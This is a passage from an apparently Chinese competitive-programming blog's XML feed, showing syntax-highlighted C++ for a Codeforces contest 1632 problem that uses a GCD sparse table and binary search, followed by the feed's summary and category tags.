class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];f[i][<span class="number">0</span>]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">20</span>;k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i+(<span class="number">1</span>&lt;&lt;k)<span class="number">-1</span>&lt;=n;i++)&#123;</span><br><span class="line">            f[i][k]=<span class="built_in">gcd</span>(f[i][k<span class="number">-1</span>],f[i+(<span class="number">1</span>&lt;&lt;k<span class="number">-1</span>)][k<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    lg[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    lg[i]=lg[i/<span class="number">2</span>]+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">      <span class="type">int</span> l=<span class="number">1</span>,r=i,whereL=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">        <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">query</span>(mid,i)==i-mid+<span class="number">1</span>)&#123;whereL=mid;<span class="keyword">break</span>;&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">query</span>(mid,i)&lt;i-mid+<span class="number">1</span>)l=mid+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> r=mid<span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(!whereL)ans[i]=ans[i<span class="number">-1</span>];</span><br><span class="line">      <span class="keyword">else</span> ans[i]=ans[whereL<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;cf1632&quot;&gt;CF1632&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;题目链接 ：&lt;a href=&quot;http://codeforces.com/contest/1632&quot;&gt;http://codeforces.com/contest/1632&lt;/a&gt;&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="acm" scheme="http://zzuzyj.github.io/categories/acm/"/>
    
    
    <category term="codeforces" scheme="http://zzuzyj.github.io/tags/codeforces/"/>
    
  </entry>
  
</feed>
